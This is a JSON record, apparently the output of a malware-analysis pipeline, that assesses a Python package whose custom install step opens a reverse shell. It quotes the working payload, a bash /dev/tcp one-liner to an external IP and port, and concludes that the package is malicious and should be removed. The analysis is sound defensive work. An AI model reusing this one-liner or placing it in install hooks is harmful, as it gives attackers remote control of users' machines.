{
  "purpose": "The code defines a Python package setup that, during installation, executes a reverse shell connecting to IP 114.116.119.253 on port 7777, indicating malicious intent to establish remote control.",
  "sources": "The os.system() call executing 'bash -c \"bash -i >& /dev/tcp/114.116.119.253/7777 <&1\"' during the run() method of the custom install class.",
  "sinks": "The reverse shell command which opens a network connection to an external IP, allowing remote command execution and potential data exfiltration.",
  "flows": "During package installation, the custom run() method executes the os.system() call, establishing a reverse shell to the specified IP and port.",
  "anomalies": "Use of os.system() to run a reverse shell command during package installation, which is highly unusual and indicative of malicious activity.",
  "analysis": "The code imports setuptools and overrides the install command to include a reverse shell payload executed via os.system(). This payload connects to an external IP, enabling remote control. The code is straightforward, with no obfuscation, and the malicious activity is explicit. All reports correctly identify this behavior, assigning high malware (1) and security risk (1) scores, with confidence levels at or near 1. The behavior is clearly malicious, representing a severe security threat, and the scores are justified by the evidence.",
  "conclusion": "The code contains a clear, active malicious payload that executes a reverse shell during installation, representing a severe security risk. All reports correctly identify this, and the scores are appropriate. The package should be flagged as malicious and removed from distribution channels.",
